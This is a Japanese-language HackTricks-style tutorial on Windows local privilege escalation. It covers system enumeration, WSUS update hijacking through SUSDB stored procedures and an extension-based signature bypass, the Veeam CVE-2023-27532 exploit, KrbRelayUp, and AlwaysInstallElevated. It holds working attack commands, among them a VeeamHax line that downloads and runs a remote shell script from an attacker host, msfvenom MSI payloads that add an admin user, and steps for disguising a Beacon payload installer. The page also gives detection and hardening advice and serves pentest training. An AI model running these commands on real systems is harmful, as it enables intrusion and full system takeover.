# Windowsローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windowsのローカル権限昇格ベクトルの調査に最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドに基づき、Windowsの権限昇格に関する一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙手順には、コミュニティのワークショップやチェックリストも取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> また、過去の攻撃手法に関する内容には、Windowsの権限昇格についてのDerbyConプレゼンテーションが含まれています。<sup>[[5]](#references)</sup>

## Windowsの基礎知識

### Access Tokens

**Windowsのaccess tokenについて知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEsの詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windowsのintegrity levelについて知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windowsのセキュリティ制御

Windowsには、**システムの列挙**や実行ファイルの起動を**妨げたり**、さらには**活動を検知したり**する仕組みがあります。権限昇格の列挙を始める前に、次の**ページを読み**、これらの**防御メカニズム**をすべて**列挙**してください。


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでのUEFI NVRAM編集を、起動前のDMAとWindowsの`SYSTEM`メモリパッチ適用につなげることもできます。

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccessによるサイレント昇格

`RAiLaunchAdminProcess`経由で起動されたUIAccessプロセスは、AppInfoのsecure-pathチェックを回避すれば、プロンプトなしでHigh ILに到達するために悪用できます。専用のUIAccess/Admin Protectionバイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktopのアクセシビリティレジストリ伝播を悪用すると、任意のSYSTEMレジストリ書き込み（RegPwn）が可能です:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近のWindowsビルドでは、特権を持つローカルNTLM認証が再利用されたSMB TCP接続経由で反射される、**SMB任意ポート**経由のLPE手法も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

既存のPowerShellセッションからローカル情報を収集するには、[.NETによるWindowsの列挙](../basic-powershell-for-pentesters/dotnet-enumeration.md)を参照してください。これらの例は、別途列挙用の実行ファイルを起動することなく、以下の確認を補完します。

### バージョン情報の列挙

Windowsのバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン exploit

Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに、この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)が役立ちます。このデータベースには4,700件を超えるセキュリティ脆弱性が掲載されており、Windows環境がもたらす**巨大な攻撃対象領域**を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSビルド、インストール済み更新プログラム、および候補となるアドバイザリを調査します。結果が該当するものとして扱う前に、正確な製品と置き換え後の更新プログラムを確認してください。

バージョン固有のローカル exploit を使う場合は、OSアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64ビット版Windowsでは、32ビットプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32`は32ビットのシステムディレクトリを指しますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64ビットプロセスでは使用できません。OSビルドや未適用KBの候補が見つかっただけでは、exploit可能であることの証明にはなりません。実行中のビルド、インストール済みまたは置き換え後の更新プログラム、プロセスアーキテクチャ、およびexploitの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照らし合わせてください。

サービスのメモリ破損の例については、[クライアントが制御するMIDI共有メモリリングのオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットはテスト済みビルドにのみ適用されます。`LOCAL SERVICE`への昇格は、その後に[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)を使って`SYSTEM`へ昇格する手順とは別です。<sup>[[44]](#references)</sup>

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploitのGitHubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存されている認証情報やJuicy情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShellの履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell トランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、この機能を有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` は一例にすぎません。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルを出力することもできます。トランスクリプトを確認する前に、実際の出力先とファイルの ACL を確認してください。コマンドの引数や出力（認証情報を含む場合があります）が記録されている可能性があります。読み取り可能なトランスクリプトが手掛かりとなるのは、その内容から利用可能な高権限の ID が判明し、かつその ID で関連するコンテキストにログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」ではなく「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログの直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティと全内容が記録され、コードの各ブロックが実行時に確実に文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows イベント ビューアーの次のパスにあります: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**.\
最後の 20 件のイベントを表示するには、次のコマンドを使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のように要約していました。

更新プログラムの要求に http**S** ではなく http が使われている場合、システムが侵害される可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者が通信を傍受または制御できるか、そしてクライアントの更新プログラムに対する信頼設定とインストールポリシーにも左右されます。URLだけでコード実行が可能だとは判断できません。[Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmdで次のコマンドを実行し、ネットワークで非SSLのWSUS更新が使用されているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようになります。

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

元の適用条件に関する記述は次のとおりです。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSのエントリは無視されます。

`UseWUServer` が `1` の場合、Windows Updateは設定済みのイントラネットサービスを使用します。これはHTTP interception経路の前提条件を確認するものですが、interception、悪意ある更新プログラムの受け入れ、または昇格した権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定されたWSUSエンドポイントは選択されません。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus)などのツールを使用できます。これらは、SSLを使わないWSUS通信に「偽の」更新プログラムを注入するための、MiTM weaponized exploitスクリプトです。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグがexploitする脆弱性は次のとおりです。

> ローカルユーザーのproxyを変更でき、Windows UpdatesがInternet Explorerの設定で構成されたproxyを使用する場合、ローカルで[PyWSUS](https://github.com/GoSecure/pywsus)を実行して自身の通信をinterceptし、資産上で昇格したユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSホスト名用の自己署名証明書を生成し、それを現在のユーザーの証明書ストアに追加すれば、HTTPとHTTPSの両方のWSUS通信をinterceptできます。WSUSには、証明書に対してtrust-on-first-use型の検証を行うHSTSのような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはそれを受け入れます。

この脆弱性は、ツール[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)を使ってexploitできます（公開後）。

### WSUS管理者が制御する更新プログラム

現在のIDがWSUSサーバー上で更新プログラムを**公開および承認**できる場合、別の経路が存在します。サーバーの`WSUS Administrators`グループへの実効的な所属状況と、委任されたWSUS権限を確認し、承認済み更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoftの説明では、更新プログラムの承認にはWSUS Administrator権限が必要です](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開に関する信頼関係も説明されています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使われた証明書を信頼する必要があります。この経路を権限昇格として扱う前に、候補となる更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が成立することは確認できません。

### SUSDBのカスタム更新プログラム悪用：`.txt`/`.esd`経由の未署名payload

これは、HTTP WSUS接続をinterceptする方法とは異なる信頼境界の問題です。前提条件は、カスタム更新プログラムを公開および承認できるだけの**WSUSデータベース（`SUSDB`）ストアドプロシージャへのアクセス権**です。実用的な侵入経路の一つは、上流WSUSのコンピューターアカウントを、`SUSDB`をホストする別のMSSQLサーバーにリレーする方法です。正確な前提条件は環境によって異なるため、SQL administrator権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530からLDAP、SMB、またはAD CSへのWSUSクライアント認証のリレーを利用する別の攻撃経路については、[WSUS HTTPを悪用したNTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへのリレーとストアドプロシージャの権限を確認する

WSUSが外部SQL Serverを使用する環境では、まずWSUSサーバーアカウントがデータベースに認証できるか、またNTLM relayがそのリスナーに到達するかを確認してください。サーバーのSQLロールによっては、テーブルへの直接書き込みが拒否されていても、更新プログラムを公開するストアドプロシージャを利用できる場合があります。`SUSDB`への`UPDATE`が失敗しても、公開が阻止されているとは限りません。カスタム更新プログラムを試す前に、許可されたSQLセッションで実効ID、ロールへの所属状況、ストアドプロシージャの権限を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブのプロシージャ定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構築する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメントタイプ `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しが返すローカルリビジョン ID を取得し、バンドルの関係、ダイジェスト、サイズ、コンテンツ URL、リビジョンに一貫性を持たせてください。これは状態を持つ公開ワークフローであるため、ストアドプロシージャの呼び出しが一度成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新を構築し、対象を指定して承認する

カスタム更新ワークフローでは、正規の WSUS プロシージャを制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータをインポートする | `spImportUpdate` |
| 前提条件、ローカライズ済み、拡張 XML フラグメントを保存する | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付ける | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加する | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストールを承認する | `@actionID = 0` および `@isAssigned = 1` を指定して `spDeployUpdate` を実行する |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを設定した後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新、グループ、展開の識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUSは通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`内の.NET `VerifyFile`処理では、指定されたファイル名が`.txt`または`.esd`で終わる場合、証明書チェックフラグがfalseに設定されます。その結果、バイト列がテキストまたは正当なESDイメージであることを事前に確認せずに、`CheckCertificateSignature`がスキップされます。したがって、たとえば`payload.exe.txt`という名前を付けた変更されていないPEはコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシー／型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みのコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分で、転送には最初に`HEAD`/`GET`のフローがあり、バイト範囲リクエストも使用されるためです。Rangeをサポートしないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、インポート/フラグメント/URL/グループ/デプロイの連鎖に必要なSQLを生成し、それを実行するための改変済みMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`も同梱しています。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 自動実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を有効にすると、承認済みの更新プログラムがダウンロードされ、ユーザーが手動で選択しなくても、設定されたスケジュールに従ってインストールされます。テストでは、更新プログラムが失敗または未完了のまま残ったペイロードは、コールバックプロセスの終了後すぐに再度提示されました。そのため、再試行動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちやすい方法です。<sup>[[39]](#references)</sup>

#### 検知とハードニングの要点

この手法で有効なサーバー側およびクライアント側の調査ポイントは次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新ペイロード、想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、および `EventId=364` を確認します。拡張子だけを信頼せず、ペイロードの拡張子とコンテンツのマジックナンバーを照合して検証状況を調査します。
- Windows Update のインストールが繰り返し失敗・再試行される動作、および `.txt` や `.esd` という名前のコンテンツからの PE 実行や、想定外の子プロセス・ネットワーク動作をハントします。
- サポートされている場合はデータベースサービスで認証の Extended Protection を必須にし、データベースへのネットワークアクセスを WSUS サーバーと許可された管理システムに制限します。カスタム更新手順に対する `EXECUTE` 権限を最小限にし、監査します。

## サードパーティ製自動アップデーターと Agent IPC (ローカル権限昇格)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと、特権を使う更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正なルート CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc の手法 – CVE-2025-0309 に基づく）については、以下を参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM 権限)

バージョン固有の元の説明と偵察メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、攻撃者が制御するメッセージを処理する localhost サービスを **TCP/9401** で公開しており、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** を使うコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424) では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が説明されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認してから、インストール済みの製品とパッチのメタデータを調査します。`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりであり、完全なパッチ確認にはなりません。
- **修正済みバージョン**: Veeam は **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を最初の修正済みリリースとして挙げています。それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: 必要な Veeam DLL とともに `VeeamHax.exe` などの PoC を同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードを実行します。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスは SYSTEM としてコマンドを実行します。

引用されている PoC は、追加の前提条件が満たされる場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下で、Windows の**ドメイン**環境に**ローカル権限昇格**の脆弱性が存在します。条件には、**LDAP signing が強制されていない**環境、ユーザーが**リソースベースの制約付き委任 (RBCD)** を設定できる自己権限を持っていること、ユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの**要件**は**デフォルト設定**で満たされることに注意してください。

ローカル Kerberos relay は、適切な COM サーバーが認証を行い、リレーされたプリンシパルが対象オブジェクトに対する権限を持つ場合、低権限のログオンから特権ディレクトリ書き込みへと到達する可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink` (shadow-credential) の LDAP 書き込みの両方が説明されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD のチェーンには、該当する委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential のチェーンには、キー認証情報の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで実行できるものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) および [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ポリシー、リレーされる ID のオブジェクト ACL、選択された COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使用するログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムも結果に影響します。許容的なポリシーや一致する ACL はレビュー対象として扱ってください。受動的な列挙によって、COM coercion、relay 認証、ディレクトリ書き込みを発生させてはなりません。マシンアカウントの shadow credential はマシンチケットにつながる可能性があり、そのアカウントが必要なディレクトリ複製権限を持つ場合に限り、別途 DCSync の経路につながる可能性があります。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で**exploit を確認してください**

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが**有効** (値が **0x1**) の場合、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール** (実行) できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session があれば、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、権限昇格用の Windows MSI バイナリをカレントディレクトリ内に作成します。このスクリプトは、ユーザーまたはグループの追加を促すプリコンパイル済み MSI インストーラーを書き出します（そのため、GIU アクセスが必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行するだけで、権限を昇格できます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、こちらのチュートリアルを参照してください。「**コマンドライン**」を**実行**するだけなら、「**.bat**」ファイルをラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使って、新しい **Windows EXE TCP payload** を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- **AlwaysPrivesc** などのプロジェクト名を指定し、場所に **`C:\privesc`** を指定して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- 手順 3/4（追加するファイルの選択）が表示されるまで **Next** をクリックします。**Add** をクリックし、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティはほかにもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行と同時に Beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルの**インストール**を**バックグラウンドで**実行するには：

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

